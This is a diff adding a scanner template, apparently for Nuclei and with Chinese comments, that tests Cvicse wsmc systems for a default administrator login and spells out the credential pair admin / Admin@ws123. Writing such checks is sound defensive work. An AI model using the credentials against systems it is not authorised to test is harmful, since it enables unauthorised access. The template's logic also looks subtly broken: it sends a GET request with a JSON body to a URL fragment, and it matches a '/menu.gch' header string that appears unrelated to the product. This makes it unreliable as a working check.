@@ -1,0 +1,40 @@
+id: wsmc-default-login
+
+info:
+  name: Cvicse ws Default Login  #名称
+  author: ws          #作者
+  severity: high      #危险等级
+  description: Default login credentials were discovered for a cvicse-wsmc. #说明
+  classification:       #分类
+    cwe-id: CWE-798     #模板的CWE-ID
+  metadata:             #元数据
+    max-request: 1      #自定义条目
+  tags: cvicse-ws,default-login   #tag
+
+http:
+  - raw:
+      - |
+        GET /inforguard/#/login HTTP/1.1
+        Host: {{Hostname}}
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - Admin@ws123
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "/menu.gch"
+        part: header
+
+# digest: 4a0a0047304502201dae0347d4fa926986d01f472884cbc0ff36f41fd9e810a538b97a2f0edcdaab022100c2a949b7e213eca0a23fd1fafbccefbc89468ef80a0af4fd072bbfc704faae11:922c64590222798bb761d5b6d8e72950
